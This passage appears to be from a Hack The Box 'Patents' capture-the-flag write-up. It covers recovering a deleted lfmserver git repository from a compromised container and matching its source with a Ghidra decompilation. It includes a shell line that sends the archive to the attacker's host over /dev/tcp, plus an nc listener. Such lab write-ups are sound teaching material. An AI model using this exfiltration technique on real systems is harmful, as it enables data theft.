+ delete mode 100644 process.c
+ delete mode 100644 process.h
+ delete mode 100644 socket_io.c
+ delete mode 100644 socket_io.h
+ delete mode 100644 thread.c
+ delete mode 100644 thread.h
+</code></pre></div></div>
+<p>Using git log, we can see past commits. Seems like the files were deleted… Luckily, we can easily recover them. We want to recover the lfmserver, as well as the source.</p>
+
+<p>We can transfer the whole git repository to our machine, by archiving it and then sending it to our machine.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@8d8f7bbd30e4:/usr/src# <span class="nb">tar</span> <span class="nt">-czf</span> lfm.tar.gz lfm/
+root@8d8f7bbd30e4:/usr/src# <span class="nb">cat </span>lfm.tar.gz <span class="o">&gt;</span> /dev/tcp/10.10.14.5/1234
+
+root@silence:~# nc <span class="nt">-lvnp</span> 1234 <span class="o">&gt;</span> lfm.tar.gz
+Ncat: Version 7.80 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
+Ncat: Listening on :::1234
+Ncat: Listening on 0.0.0.0:1234
+Ncat: Connection from 10.10.10.173.
+Ncat: Connection from 10.10.10.173:39164.
+root@silence:~# <span class="nb">tar</span> <span class="nt">-xzf</span> lfm.tar.gz
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@silence:~/lfm# git checkout 1bbc518518cdde0126103cd4c6e7e6dfcdd36d3e
+root@silence:~/lfm# <span class="nb">cat </span>README
+This is an implementation of the Lightweight File Manager LFM Protocol.
+It<span class="s1">'s a pre-fork and pre-thread server, which supports re-forking and re-threading
+when the number of child processes of threads goes below a threshold.
+
+It'</span>s similar to HTTP, and supports the following methods:
+
+GET /object LFM     <span class="o">[</span><span class="se">\r\n</span><span class="o">]</span>
+<span class="nv">User</span><span class="o">=</span>user           <span class="o">[</span><span class="se">\r\n</span><span class="o">]</span>
+<span class="nv">Password</span><span class="o">=</span>password   <span class="o">[</span><span class="se">\r\n</span><span class="o">]</span>
+                    <span class="o">[</span><span class="se">\r\n</span><span class="o">]</span>
+
+CHECK /object LFM   <span class="o">[</span><span class="se">\r\n</span><span class="o">]</span>
+<span class="nv">User</span><span class="o">=</span>user           <span class="o">[</span><span class="se">\r\n</span><span class="o">]</span>
+<span class="nv">Password</span><span class="o">=</span>password   <span class="o">[</span><span class="se">\r\n</span><span class="o">]</span>
+                    <span class="o">[</span><span class="se">\r\n</span><span class="o">]</span>
+md5_of_the_file     <span class="o">[</span><span class="se">\r\n</span><span class="o">]</span>
+                    <span class="o">[</span><span class="se">\r\n</span><span class="o">]</span>
+
+
+PUT /object LFM     <span class="o">[</span><span class="se">\r\n</span><span class="o">]</span>
+<span class="nv">User</span><span class="o">=</span>user           <span class="o">[</span><span class="se">\r\n</span><span class="o">]</span>
+<span class="nv">Password</span><span class="o">=</span>password   <span class="o">[</span><span class="se">\r\n</span><span class="o">]</span>
+                    <span class="o">[</span><span class="se">\r\n</span><span class="o">]</span>
+bytes_of_the_file
+
+
+Communication is based on TCP.
+Default port is 5000.
+</code></pre></div></div>
+<p>Going through the repository, we can find a README, that explains how the protocol works. If we remember back to our nmap scan, there was port 8888 open. We can check if the protocol is running on that port by quickly connecting to it.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@silence:~# nc 10.10.10.173 8888
+A
+LFM 400 BAD REQUEST
+</code></pre></div></div>
+<p>Further checking out the repository, we find the used libc version, which is <a href="https://launchpad.net/ubuntu/cosmic/amd64/libc6/2.28-0ubuntu1">libc6 2.28-0ubuntu1</a>.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@silence:~/lfm# git checkout a900ccf7ae75b95db5f2d134d80e359a795e0cc6
+root@silence:~/lfm# git show
+commit 7c6609240f414a2cb8af00f75fdc7cfbf04755f5 <span class="o">(</span>HEAD, master<span class="o">)</span>
+Author: gbyolo &lt;gbyolo.htb&gt;
+Date:   Mon May 20 17:04:37 2019 +0200
+
+    Removed meow files. THIS REPOSITORY IS ON SVN
+
+diff <span class="nt">--git</span> a/README b/README
+deleted file mode 100644
+index 3c770da..0000000
+<span class="nt">---</span> a/README
++++ /dev/null
+@@ <span class="nt">-1</span>,12 +0,0 @@
+<span class="nt">-lfmserver</span><span class="s1">' dynamic libraries:
+-        linux-vdso.so.1 (0x00007ffda19f0000)
+-        libm.so.6 =&gt; /lib/x86_64-linux-gnu/libm.so.6 (0x00007f5444090000)
+-        libcrypto.so.1.1 =&gt; /usr/lib/x86_64-linux-gnu/libcrypto.so.1.1 (0x00007f5443dc5000)
+-        libpthread.so.0 =&gt; /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f5443da4000)
+-        libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f5443bba000)
+-        /lib64/ld-linux-x86-64.so.2 (0x00007f5444226000)
+-        libdl.so.2 =&gt; /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f5443bb4000)
+-
+-NB: lfmserver was compiled against:
+-- libc6: 2.28-0ubuntu1
+-- libssl1.1: 1.1.1-1ubuntu2.1
+</span></code></pre></div></div>
+<p>This is definitely important information that we can use later once we exploit the binary.</p>
+
+<h2 id="reversing-lfmserver">Reversing lfmserver</h2>
+<p>Now that we have recovered the necessary files, let us check both the binary and the source code for any interesting information.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">root</span><span class="err">@</span><span class="n">silence</span><span class="o">:~/</span><span class="n">lfm</span><span class="err">#</span> <span class="n">cat</span> <span class="n">lfm</span><span class="p">.</span><span class="n">c</span>
+<span class="cp">#include "lfm.h"
+</span>
+<span class="p">[...]</span>
+
+<span class="kt">void</span> <span class="nf">url_decode</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">src</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">dest</span><span class="p">,</span> <span class="kt">int</span> <span class="n">max</span><span class="p">)</span> <span class="p">{</span>
+    <span class="c1">// TODO: implement</span>
+<span class="p">}</span>
+<span class="n">root</span><span class="err">@</span><span class="n">silence</span><span class="o">:~/</span><span class="n">lfm</span><span class="err">#</span> <span class="n">grep</span> <span class="o">-</span><span class="n">rni</span> <span class="n">todo</span>
+<span class="n">lfm</span><span class="p">.</span><span class="n">c</span><span class="o">:</span><span class="mi">10</span><span class="o">:</span>    <span class="c1">// TODO: implement</span>
+<span class="n">lfm</span><span class="p">.</span><span class="n">c</span><span class="o">:</span><span class="mi">315</span><span class="o">:</span>   <span class="c1">// TODO: implement</span>
+<span class="n">lfm</span><span class="p">.</span><span class="n">c</span><span class="o">:</span><span class="mi">323</span><span class="o">:</span>   <span class="c1">// TODO: implement</span>
+<span class="n">lfm</span><span class="p">.</span><span class="n">c</span><span class="o">:</span><span class="mi">344</span><span class="o">:</span>   <span class="c1">// TODO: implement</span>
+</code></pre></div></div>
+<p>Going through the sources code, we can find a couple of TODO notes.
+We can use the makefile and compile the lfmserver ourself.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@silence:~/lfm# <span class="nb">md5sum </span>lfmserver
+a70cfd150c0a999fc28daf370d689b16  lfmserver
+root@silence:~# <span class="nb">md5sum </span>lfmserver
+bc2dbf9842cdf1a5e46737a9f47f8c5b  lfmserver
+</code></pre></div></div>
+<p>The compiled server differs from the github one. It could be that the server on the docker host has these TODO functions implemented. Let us open the file in ghidra nad analyze it, to see if any changes were implemented.</p>
+
+<p>The whole next section will be the decompiled code from ghidra matched with the source code. The complete ghidra project can be found on my <a href="https://github.com/chr0x6eos/HTB/blob/master/Patents/lfmserver-decompiled.gzf">Github</a>.</p>
+
+<h3 id="main-function-fun_004055c2">main function (FUN_004055c2)</h3>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span><span class="kt">char</span> <span class="n">argv</span><span class="p">[])</span>
+<span class="p">{</span>
+  <span class="n">uint</span> <span class="n">socketfd</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">setsockopt_res</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">bind_res</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">listen_res</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">p</span><span class="p">;</span>
+  <span class="n">ulong</span> <span class="n">logfile</span><span class="p">;</span>
+  <span class="n">protoent</span> <span class="o">*</span><span class="n">protocol</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="o">*</span><span class="n">piVar1</span><span class="p">;</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">pcVar2</span><span class="p">;</span>
+  <span class="n">uint</span> <span class="o">*</span><span class="n">puVar3</span><span class="p">;</span>
+  <span class="n">ulong</span> <span class="n">accept_sem_id</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">n_child</span><span class="o">-</span><span class="n">alive_children</span><span class="p">;</span>
+  <span class="n">undefined7</span> <span class="n">in_register_00000031</span><span class="p">;</span>
+  <span class="kt">double</span> <span class="n">rounded_percentage</span><span class="p">;</span>
+  <span class="n">undefined8</span> <span class="n">config_file</span> <span class="p">[</span><span class="mi">8</span><span class="p">];</span>
+  <span class="n">undefined8</span> <span class="o">*</span><span class="n">argv</span><span class="p">;</span>
+  <span class="n">undefined4</span> <span class="n">reuse_addr</span><span class="p">;</span>
+  <span class="n">sa_family_t</span> <span class="n">addr</span><span class="p">;</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">logfilename</span><span class="p">;</span>
+  <span class="n">uint</span> <span class="n">p1</span><span class="p">;</span>
+  <span class="n">uint</span> <span class="n">port</span><span class="p">;</span>
+
+  <span class="n">argv</span> <span class="o">=</span> <span class="p">(</span><span class="n">undefined8</span> <span class="o">*</span><span class="p">)</span><span class="n">CONCAT71</span><span class="p">(</span><span class="n">in_register_00000031</span><span class="p">,</span><span class="n">argv</span><span class="p">[]);</span>
+  <span class="n">p1</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">logfilename</span> <span class="o">=</span> <span class="n">PTR_s_lfmserver</span><span class="p">.</span><span class="n">log_00409298</span><span class="p">;</span>
+  <span class="n">reuse_addr</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">==</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">check_option</span><span class="p">(</span><span class="o">*</span><span class="n">argv</span><span class="p">,(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">,(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">,(</span><span class="kt">char</span> <span class="o">**</span><span class="p">)</span><span class="mh">0x0</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">else</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">==</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">check_option</span><span class="p">(</span><span class="o">*</span><span class="n">argv</span><span class="p">,(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">p1</span><span class="p">,</span><span class="o">&amp;</span><span class="n">logfilename</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">else</span> <span class="p">{</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">==</span> <span class="mi">5</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">check_option</span><span class="p">(</span><span class="o">*</span><span class="n">argv</span><span class="p">,(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">p1</span><span class="p">,</span><span class="o">&amp;</span><span class="n">logfilename</span><span class="p">);</span>
+        <span class="n">check_option</span><span class="p">(</span><span class="o">*</span><span class="n">argv</span><span class="p">,(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">],(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">argv</span><span class="p">[</span><span class="mi">4</span><span class="p">],(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">p1</span><span class="p">,</span><span class="o">&amp;</span><span class="n">logfilename</span><span class="p">);</span>
+      <span class="p">}</span>
+      <span class="k">else</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(((</span><span class="n">argc</span> <span class="o">==</span> <span class="mi">2</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="n">argc</span> <span class="o">==</span> <span class="mi">4</span><span class="p">))</span> <span class="o">||</span> <span class="p">(</span><span class="mi">5</span> <span class="o">&lt;</span> <span class="n">argc</span><span class="p">))</span> <span class="p">{</span>
+          <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span><span class="s">"Usage: %s [-p port_number] [-l logfilename.log]</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="o">*</span><span class="n">argv</span><span class="p">);</span>
+                    <span class="cm">/* WARNING: Subroutine does not return */</span>
+          <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+        <span class="p">}</span>
+      <span class="p">}</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+  <span class="n">logfile</span> <span class="o">=</span> <span class="n">openfile_low</span><span class="p">(</span><span class="n">logfilename</span><span class="p">,</span><span class="mh">0x241</span><span class="p">,</span><span class="mh">0x1a4</span><span class="p">);</span>
+  <span class="n">logfile</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">logfile</span><span class="p">;</span>
+  <span class="n">redirect</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="n">logfile</span><span class="p">);</span>
+  <span class="n">log_init</span><span class="p">(</span><span class="s">"lfmserver"</span><span class="p">);</span>
+  <span class="n">parse_config_file</span><span class="p">(</span><span class="n">config_file</span><span class="p">,</span><span class="n">config_file</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">p1</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">port</span> <span class="o">=</span> <span class="p">(</span><span class="n">uint</span><span class="p">)</span><span class="n">param_config</span><span class="p">.</span><span class="n">port</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">else</span> <span class="p">{</span>
+    <span class="n">port</span> <span class="o">=</span> <span class="n">p1</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="n">N_CHILD</span> <span class="o">=</span> <span class="p">(</span><span class="n">uint</span><span class="p">)</span><span class="n">param_config</span><span class="p">.</span><span class="n">nums_of_children</span><span class="p">;</span>
+  <span class="n">perc_dead_child</span> <span class="o">=</span> <span class="n">DAT_00409288</span><span class="p">.</span><span class="n">_4_4_</span><span class="p">;</span>
+  <span class="n">system_log</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span><span class="s">"Server starting on port %d. Logfile = %s</span><span class="se">\n</span><span class="s">Number of children: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,(</span><span class="n">ulong</span><span class="p">)</span><span class="n">port</span><span class="p">,</span>
+             <span class="n">logfilename</span><span class="p">,(</span><span class="n">ulong</span><span class="p">)(</span><span class="n">uint</span><span class="p">)</span><span class="n">param_config</span><span class="p">.</span><span class="n">nums_of_children</span><span class="p">);</span>
+  <span class="n">system_log</span><span class="p">((</span><span class="kt">double</span><span class="p">)</span><span class="n">perc_dead_child</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="s">"perc_dead_child: %f</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+  <span class="n">protocol</span> <span class="o">=</span> <span class="n">getprotobyname</span><span class="p">(</span><span class="s">"tcp"</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">protocol</span> <span class="o">==</span> <span class="p">(</span><span class="n">protoent</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">fwrite</span><span class="p">(</span><span class="s">"ERROR getting tcp protocol number </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x23</span><span class="p">,</span><span class="n">stdout</span><span class="p">);</span>
+    <span class="n">piVar1</span> <span class="o">=</span> <span class="n">__errno_location</span><span class="p">();</span>
+    <span class="n">pcVar2</span> <span class="o">=</span> <span class="n">strerror</span><span class="p">(</span><span class="o">*</span><span class="n">piVar1</span><span class="p">);</span>
+    <span class="n">system_log</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="s">"ERROR in getting tcp protocol number (%s)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">pcVar2</span><span class="p">);</span>
+    <span class="n">closefile_low</span><span class="p">(</span><span class="n">logfile</span><span class="p">);</span>
+                    <span class="cm">/* WARNING: Subroutine does not return */</span>
+    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="n">socketfd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="n">protocol</span><span class="o">-&gt;</span><span class="n">p_proto</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">socketfd</span> <span class="o">==</span> <span class="mh">0xffffffff</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">puVar3</span> <span class="o">=</span> <span class="p">(</span><span class="n">uint</span> <span class="o">*</span><span class="p">)</span><span class="n">__errno_location</span><span class="p">();</span>
+    <span class="n">fprintf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span><span class="s">"ERROR creating socket. errno = %d </span><span class="se">\n</span><span class="s">"</span><span class="p">,(</span><span class="n">ulong</span><span class="p">)</span><span class="o">*</span><span class="n">puVar3</span><span class="p">);</span>
+    <span class="n">piVar1</span> <span class="o">=</span> <span class="n">__errno_location</span><span class="p">();</span>
+    <span class="n">pcVar2</span> <span class="o">=</span> <span class="n">strerror</span><span class="p">(</span><span class="o">*</span><span class="n">piVar1</span><span class="p">);</span>
+    <span class="n">system_log</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="s">"ERORR creating socket (%s)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">pcVar2</span><span class="p">);</span>
+    <span class="n">closefile_low</span><span class="p">(</span><span class="n">logfile</span><span class="p">);</span>
+                    <span class="cm">/* WARNING: Subroutine does not return */</span>
+    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="n">system_log</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span><span class="s">"socket created (fd=%d) </span><span class="se">\n</span><span class="s">"</span><span class="p">,(</span><span class="n">ulong</span><span class="p">)</span><span class="n">socketfd</span><span class="p">);</span>
+  <span class="n">setsockopt_res</span> <span class="o">=</span> <span class="n">setsockopt</span><span class="p">(</span><span class="n">socketfd</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="o">&amp;</span><span class="n">reuse_addr</span><span class="p">,</span><span class="mi">4</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">setsockopt_res</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">puVar3</span> <span class="o">=</span> <span class="p">(</span><span class="n">uint</span> <span class="o">*</span><span class="p">)</span><span class="n">__errno_location</span><span class="p">();</span>
+    <span class="n">fprintf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span><span class="s">"ERROR re-using socket. errno = %d </span><span class="se">\n</span><span class="s">"</span><span class="p">,(</span><span class="n">ulong</span><span class="p">)</span><span class="o">*</span><span class="n">puVar3</span><span class="p">);</span>
+    <span class="n">piVar1</span> <span class="o">=</span> <span class="n">__errno_location</span><span class="p">();</span>
+    <span class="n">pcVar2</span> <span class="o">=</span> <span class="n">strerror</span><span class="p">(</span><span class="o">*</span><span class="n">piVar1</span><span class="p">);</span>
+    <span class="n">system_log</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="s">"ERROR in setting SO_REUSEADDR option (%s)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">pcVar2</span><span class="p">);</span>
+    <span class="n">closefile_low</span><span class="p">(</span><span class="n">logfile</span><span class="p">);</span>
+                    <span class="cm">/* WARNING: Subroutine does not return */</span>
+    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">addr</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x10</span><span class="p">);</span>
+  <span class="n">addr</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
+  <span class="n">htonl</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+  <span class="n">htons</span><span class="p">((</span><span class="kt">uint16_t</span><span class="p">)</span><span class="n">port</span><span class="p">);</span>
+  <span class="n">bind_res</span> <span class="o">=</span> <span class="n">bind</span><span class="p">(</span><span class="n">socketfd</span><span class="p">,(</span><span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">addr</span><span class="p">,</span><span class="mh">0x10</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">bind_res</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">puVar3</span> <span class="o">=</span> <span class="p">(</span><span class="n">uint</span> <span class="o">*</span><span class="p">)</span><span class="n">__errno_location</span><span class="p">();</span>
+    <span class="n">fprintf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span><span class="s">"ERROR in bind. errno = %d </span><span class="se">\n</span><span class="s">"</span><span class="p">,(</span><span class="n">ulong</span><span class="p">)</span><span class="o">*</span><span class="n">puVar3</span><span class="p">);</span>
+    <span class="n">piVar1</span> <span class="o">=</span> <span class="n">__errno_location</span><span class="p">();</span>
+    <span class="n">pcVar2</span> <span class="o">=</span> <span class="n">strerror</span><span class="p">(</span><span class="o">*</span><span class="n">piVar1</span><span class="p">);</span>
+    <span class="n">system_log</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="s">"ERROR in bind() (%s)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">pcVar2</span><span class="p">);</span>
+    <span class="n">closefile_low</span><span class="p">(</span><span class="n">logfile</span><span class="p">);</span>
+                    <span class="cm">/* WARNING: Subroutine does not return */</span>
+    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="n">system_log</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span><span class="s">"socket bind() OK</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+  <span class="n">listen_res</span> <span class="o">=</span> <span class="n">listen</span><span class="p">(</span><span class="n">socketfd</span><span class="p">,</span><span class="mh">0x80</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">listen_res</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">system_log</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span><span class="s">"listen() went ok. BACKLOG=%d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="mh">0x80</span><span class="p">);</span>
+    <span class="n">accept_sem_id</span> <span class="o">=</span> <span class="n">init_sem</span><span class="p">(</span><span class="n">socketfd</span><span class="p">);</span>
+    <span class="n">sem_id</span> <span class="o">=</span> <span class="p">(</span><span class="n">undefined4</span><span class="p">)</span><span class="n">accept_sem_id</span><span class="p">;</span>
+    <span class="n">spawn_children</span><span class="p">(</span><span class="n">socketfd</span><span class="p">,</span><span class="n">N_CHILD</span><span class="p">);</span>
+    <span class="n">install_sigchld_handler</span><span class="p">(</span><span class="n">socketfd</span><span class="p">);</span>
+    <span class="k">do</span> <span class="p">{</span>
+      <span class="k">while</span> <span class="p">((</span><span class="n">p</span> <span class="o">=</span> <span class="n">pause</span><span class="p">(),</span> <span class="n">p</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">piVar1</span> <span class="o">=</span> <span class="n">__errno_location</span><span class="p">(),</span> <span class="o">*</span><span class="n">piVar1</span> <span class="o">==</span> <span class="mi">4</span><span class="p">)))</span> <span class="p">{</span>
+        <span class="n">system_log</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="s">"One child is dead</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="n">n_child</span><span class="o">-</span><span class="n">alive_children</span> <span class="o">=</span> <span class="n">N_CHILD</span> <span class="o">-</span> <span class="n">DAT_00409380</span><span class="p">;</span>
+        <span class="n">rounded_percentage</span> <span class="o">=</span> <span class="n">floor</span><span class="p">((</span><span class="kt">double</span><span class="p">)(</span><span class="n">perc_dead_child</span> <span class="o">*</span> <span class="p">(</span><span class="kt">float</span><span class="p">)</span><span class="n">N_CHILD</span><span class="p">));</span>
+        <span class="k">if</span> <span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="n">rounded_percentage</span> <span class="o">&lt;=</span> <span class="n">n_child</span><span class="o">-</span><span class="n">alive_children</span><span class="p">)</span> <span class="p">{</span>
+          <span class="n">system_log</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span><span class="s">"Re-forking %d processes</span><span class="se">\n</span><span class="s">"</span><span class="p">,(</span><span class="n">ulong</span><span class="p">)(</span><span class="n">N_CHILD</span> <span class="o">-</span> <span class="n">DAT_00409380</span><span class="p">));</span>
+          <span class="n">spawn_children</span><span class="p">(</span><span class="n">socketfd</span><span class="p">,</span><span class="n">N_CHILD</span> <span class="o">-</span> <span class="n">DAT_00409380</span><span class="p">);</span>
+        <span class="p">}</span>
+      <span class="p">}</span>
+      <span class="n">puVar3</span> <span class="o">=</span> <span class="p">(</span><span class="n">uint</span> <span class="o">*</span><span class="p">)</span><span class="n">__errno_location</span><span class="p">();</span>
+      <span class="n">fatal_error</span><span class="p">(</span><span class="n">socketfd</span><span class="p">,</span><span class="s">"ERROR in pause()"</span><span class="p">,</span><span class="o">*</span><span class="n">puVar3</span><span class="p">);</span>
+    <span class="p">}</span> <span class="k">while</span><span class="p">(</span> <span class="nb">true</span> <span class="p">);</span>
+  <span class="p">}</span>
+  <span class="n">puVar3</span> <span class="o">=</span> <span class="p">(</span><span class="n">uint</span> <span class="o">*</span><span class="p">)</span><span class="n">__errno_location</span><span class="p">();</span>
+  <span class="n">fprintf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span><span class="s">"ERROR in listen. errno = %d </span><span class="se">\n</span><span class="s">"</span><span class="p">,(</span><span class="n">ulong</span><span class="p">)</span><span class="o">*</span><span class="n">puVar3</span><span class="p">);</span>
+  <span class="n">piVar1</span> <span class="o">=</span> <span class="n">__errno_location</span><span class="p">();</span>
+  <span class="n">pcVar2</span> <span class="o">=</span> <span class="n">strerror</span><span class="p">(</span><span class="o">*</span><span class="n">piVar1</span><span class="p">);</span>
+  <span class="n">system_log</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="s">"ERROR in listen (%s)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">pcVar2</span><span class="p">);</span>
+  <span class="n">closefile_low</span><span class="p">(</span><span class="n">logfile</span><span class="p">);</span>
+                    <span class="cm">/* WARNING: Subroutine does not return */</span>
+  <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Going through the source, I eventually found code that was not implemented in the source code, by going through the functions like this: Main –&gt; spawn_children –&gt; child_work –&gt; create_new_thread –&gt; thread_work –&gt; handle_lfm_connection –&gt; <strong>handle_check</strong> –&gt; <strong>url_decode</strong>.</p>
+
+<h3 id="handle_check-function-fun_00403ad9">handle_check function (FUN_00403ad9)</h3>
+<p>After following through the code function by function I finally came to code that was clearly different to the leaked source code. Whilst the leaked source only contained a “//TODO implement”, the ghidra disassembly showed quite more output.</p>
+
+<p>Source code:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">handle_check</span><span class="p">(</span><span class="k">struct</span> <span class="n">msg</span> <span class="o">*</span><span class="n">message</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="c1">// TODO: implement</span>
+
+	<span class="n">send_401</span><span class="p">(</span><span class="n">message</span><span class="o">-&gt;</span><span class="n">connsd</span><span class="p">);</span>
+	<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
